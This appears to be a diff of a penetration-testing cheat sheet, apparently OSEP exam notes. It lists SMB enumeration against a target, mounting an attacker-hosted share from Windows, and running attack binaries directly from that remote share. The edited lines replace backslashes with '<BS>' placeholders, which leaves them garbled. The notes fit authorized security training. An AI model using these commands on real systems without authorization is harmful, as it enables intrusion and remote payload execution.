@@ -4,11 +4,11 @@
 smbclient -L //<RHOST> -U ''
 
 # windows mount smb
-net use z: \\\<LHOST>\evil /user:evil evil
+net use z: <BS><BS><LHOST><BS>share /user:kali kali
 dir Z:\
 
 # execute files directly from smb
-net use \\<LHOST>\share /user:<USER> <PASS>
-\\<LHOST>\share\OSEP-Code-Snippets\<ATTACK_TYPE>\bin\x64\Release\<BIN>
+net use <BS><BS><LHOST><BS>share /user:<USER> <PASS>
+<BS><BS><LHOST><BS>share<BS>OSEP-Code-Snippets<BS><ATTACK_TYPE>
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
